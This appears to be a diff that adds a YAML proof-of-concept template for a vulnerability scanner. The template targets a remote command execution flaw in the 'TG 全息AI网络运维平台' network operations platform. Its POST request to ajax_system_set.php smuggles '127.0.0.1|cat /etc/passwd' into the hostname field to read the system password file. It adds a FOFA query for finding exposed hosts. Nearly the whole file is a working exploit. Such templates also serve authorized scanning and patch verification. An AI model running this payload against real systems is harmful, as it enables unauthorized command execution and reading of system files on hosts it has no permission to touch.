@@ -1,0 +1,23 @@
+id: poc-yaml-tg-holographic-ai-network-operation-and-maintenance-rce
+info:
+  name: TG 全息AI网络运维平台 多个接口远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 全息AI网络运维平台
+  fofa: body="全息AI网络运维平台"
+variables:
+  path: 'ping
+
+    nslookup
+
+    traceroute'
+requests:
+- method: POST
+  path: /nmss/toolMenu/Ajax/ajax_system_set.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: cmd={{.path}}_hostname&hostname=127.0.0.1|cat /etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+transport: http
